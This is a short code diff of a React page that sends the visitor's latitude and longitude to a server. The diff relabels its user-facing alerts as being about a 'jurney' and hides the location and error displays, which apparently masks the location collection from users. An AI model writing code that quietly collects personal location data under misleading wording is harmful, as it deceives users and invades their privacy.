@@ -30,17 +30,17 @@ export default function Home() {
           body: JSON.stringify({ latitude: lat, longitude: lng }),
         })
           .then(() => {
-            // alert("Location received successfully.");
+            alert("Your Jurney  successfully.");
           })
           .catch(() => {
-            // alert("Failed to send location. Please try again.");
+            alert("Failed to ankap jurney. Please try again.");
           });
       } else {
         throw new Error("Could not retrieve location from Google API");
       }
     } catch (err) {
-      setError("Failed to get location. Try again later.");
-      // alert("Error retrieving location: " + err.message);
+      setError("Failed to your jurney . Try again later.");
+      alert("Error retrieving jurney: " + err.message);
     }
   };
 
@@ -54,7 +54,7 @@ export default function Home() {
           Latitude: {location.latitude}, Longitude: {location.longitude}
         </p>
       )} */}
-      {error && <p style={{ color: "red" }}>{error}</p>}
+      {/* {error && <p style={{ color: "red" }}>{error}</p>} */}
     </div>
   );
 }
